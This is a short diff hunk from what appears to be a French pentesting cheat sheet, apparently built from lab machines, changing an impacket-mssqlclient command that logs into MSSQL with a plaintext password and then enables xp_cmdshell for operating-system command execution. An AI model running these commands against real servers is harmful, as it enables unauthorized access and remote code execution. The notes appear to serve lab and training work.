@@ -401,7 +401,7 @@ allow-hotplug eth0
   	6. On importe le zip dans l'interface graphique
   	7. Nous pouvons compléter l'analyse avec [AD-Miner](https://github.com/AD-Security/AD_Miner), pour trouver d'autre chemin d'attaque
 
-- Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
+- Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58 -windows-auth -port 6520`
   	- Activer le `xp_cmdshell` --> `enable_xp_cmdshell` ou ⬇️ 
 ```mssql=
 SQL (sophie  dbo@master)> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
